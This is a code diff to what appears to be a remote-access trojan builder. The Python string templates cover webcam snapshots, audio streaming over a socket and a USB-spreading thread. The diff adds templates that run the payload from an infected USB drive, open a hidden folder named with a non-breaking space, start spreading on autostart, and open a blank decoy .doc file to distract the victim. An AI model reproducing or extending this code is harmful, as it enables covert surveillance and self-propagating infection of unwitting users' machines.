@@ -1,4 +1,4 @@
-get_webcam_device = """
+get_webcam_device = r"""
 try:
     cam = vidcap.new_Dev(0, 0)
     web_camera = str(cam.getdisplayname())
@@ -7,7 +7,7 @@ except:
     web_camera = 'NoDevice'
 """
 
-get_audio_device = """
+get_audio_device = r"""
 try:
     p = pyaudio.PyAudio()
     device_name = p.get_default_input_device_info()
@@ -17,7 +17,7 @@ except IOError:
     audio_input = 'NoDevice'
 """
 
-initialize_winapi = """
+initialize_winapi = r"""
 Kernel32 = ctypes.windll.kernel32
 User32 = ctypes.windll.user32
 Shell32 = ctypes.windll.shell32
@@ -25,7 +25,7 @@ Gdi32 = ctypes.windll.gdi32
 Psapi = ctypes.windll.psapi
 """
 
-usb_spreading_class = """
+usb_spreading_class = r"""
 class UsbSpread(threading.Thread):
 
     def run(self):
@@ -77,7 +77,7 @@ class UsbSpread(threading.Thread):
             time.sleep(5)
 """
 
-webcam_shot_function = '''
+webcam_shot_function = r'''
 def webcam_shot():
     cam = vidcap.new_Dev(0, 0)
     buff, width, height = cam.getbuffer()
@@ -88,7 +88,7 @@ def webcam_shot():
     })
 '''
 
-audio_streaming_class = '''
+audio_streaming_class = r'''
 class AudioStreaming(threading.Thread):
     def __init__(self, sock, rate):
         super(AudioStreaming, self).__init__()
@@ -117,4 +117,34 @@ class AudioStreaming(threading.Thread):
 
         self.stream.close()
         self.p.terminate()
+'''
+
+from_device = r'''
+if 'VolumeInformation' in sys.argv[0]:
+    os.system('explorer %CD%\\' + unichr(160))
+    from_device()
+'''
+
+startup_on = r'''
+elif __filename__ in sys.argv[0]:
+    {%usb_spreading_on%}
+    from_autostart()
+'''
+
+open_fake_file = r'''
+    open(os.path.join(os.path.expanduser('~'), 'iDocuments', 'temp0829380013_134.doc'), 'w').write('')
+    os.startfile(os.path.join(os.path.expanduser('~'), 'iDocuments', 'temp0829380013_134.doc'))
+'''
+
+usb_spreading_on = r'''
+    usb_spreading_thread = UsbSpread()
+    usb_spreading_thread.start()
+'''
+
+run_client_if_statup_off = r'''
+    from_autostart()
+'''
+
+run_client_if_startup_on = r'''
+    from_device()
 '''
